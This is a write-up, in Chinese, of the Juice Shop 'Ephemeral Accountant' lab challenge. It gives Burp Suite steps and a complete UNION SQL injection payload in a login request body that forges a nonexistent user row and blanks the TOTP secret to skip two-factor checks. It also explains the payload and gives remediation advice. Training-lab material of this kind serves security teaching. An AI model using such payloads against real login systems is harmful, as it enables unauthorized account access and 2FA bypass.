# Ephemeral Accountant - Juice Shop (⭐⭐⭐⭐)

## 挑战目标
登录一个数据库中不存在的账户：`acc0unt4nt@juice-sh.op`，职务为 `accounting`。

## 漏洞类型
UNION 型 SQL 注入 / 临时数据构造

## 环境信息
- 靶场：Juice Shop
- 版本：v19.2.1（或其他 19.x 版本）
- 难度：四星
- 日期：2026-05-06

---

## 完整复现步骤

### 第一步：抓取登录请求
1. 打开 Juice Shop 登录页面
2. 随便输入一个邮箱和密码（用于触发请求，内容不重要）
3. 打开 Burp Suite，确保 **Intercept is on**
4. 点击 **Login**，抓取 `POST /rest/user/login` 请求

### 第二步：修改请求 Body
将抓到的请求 Body 完全替换为以下内容：

```json
{"email": "acc0unt4nt@juice-sh.op' UNION SELECT * FROM (SELECT 15 as id, '' as username, 'acc0unt4nt@juice-sh.op' as email, '12345' as password, 'accounting' as role, '123' as deluxeToken, '1.2.3.4' as lastLoginIp , '/assets/public/images/uploads/default.svg' as profileImage, '' as totpSecret, 1 as isActive, '1999-08-16 14:14:41.644 +00:00' as createdAt, '1999-08-16 14:33:41.930 +00:00' as updatedAt, null as deletedAt)-- -", "password": "12345"}
```

第三步：发送请求

1. 将修改后的请求发送到 Repeater（右键 → Send to Repeater）
2. 点击 Send
3. 查看响应

第四步：验证成功

· 响应状态码：200 OK
· 响应 Body 中包含 "authentication" 字段和 "token"
· 打开 Juice Shop Score Board，Ephemeral Accountant 变绿 ✅

---

## Payload 拆解说明

| 部分 | 内容 | 作用 |
|------|------|------|
| 目标邮箱 + 闭合单引号 | `acc0unt4nt@juice-sh.op'` | 关闭原始 SQL 语句中的字符串，为 UNION 注入做准备 |
| UNION 联合查询 | `UNION SELECT * FROM (...)` | 在原始查询结果集中**拼接一行临时数据** |
| 临时数据 - id | `15 as id` | 构造一个不存在的用户 ID |
| 临时数据 - username | `'' as username` | 用户名为空 |
| 临时数据 - email | `'acc0unt4nt@juice-sh.op' as email` | **挑战目标邮箱**（必须匹配） |
| 临时数据 - password | `'12345' as password` | **密码明文**（必须与请求中的 password 一致） |
| 临时数据 - role | `'accounting' as role` | **挑战目标角色**（必须为 accounting） |
| 临时数据 - deluxeToken | `'123' as deluxeToken` | 填充 token 字段 |
| 临时数据 - lastLoginIp | `'1.2.3.4' as lastLoginIp` | 填充 IP 字段 |
| 临时数据 - profileImage | `'/assets/.../default.svg' as profileImage` | 填充头像路径 |
| 临时数据 - totpSecret | `'' as totpSecret` | **关键绕过**：设为空字符串，避免触发 TOTP 双因素认证 |
| 临时数据 - isActive | `1 as isActive` | 账号状态：激活 |
| 临时数据 - createdAt | `'1999-08-16 ...' as createdAt` | 账号创建时间 |
| 临时数据 - updatedAt | `'1999-08-16 ...' as updatedAt` | 账号更新时间 |
| 临时数据 - deletedAt | `null as deletedAt` | 未删除 |
| SQL 注释 | `-- -` | 注释掉原始语句中剩余的密码验证部分 |
---

原理说明

UNION 型 SQL 注入：后端在执行登录查询时，将用户输入的 email 直接拼接到 SQL 语句中。通过 UNION SELECT 操作符，可以在原始查询结果后面附加一行完全由攻击者构造的数据。程序遍历结果时，会逐一比对密码。当这行由攻击者构造的数据中的 password 字段值与用户输入的 password 匹配时，登录成功。

注入前：

```sql
SELECT * FROM Users WHERE email = 'acc0unt4nt@juice-sh.op'
```

注入后：

```sql
SELECT * FROM Users WHERE email = 'acc0unt4nt@juice-sh.op' UNION SELECT ... -- '
```

关键点：

· 不需要数据库中真实存在该用户
· 需要精确匹配数据库表结构（列数、列顺序）
· 需要绕过 TOTP 双因素校验（将 totpSecret 设为空）

---

修复建议

代码层面：

1. 使用参数化查询（Prepared Statement），不从字面量拼接 SQL
2. 禁止在登录接口使用动态查询
3. 对输入做严格校验，过滤 UNION、SELECT 等关键词


---

相关知识点

· UNION 型 SQL 注入
· 数据库表结构探测（ORDER BY）
· TOTP（基于时间的一次性密码）
· 双因素认证绕过

```
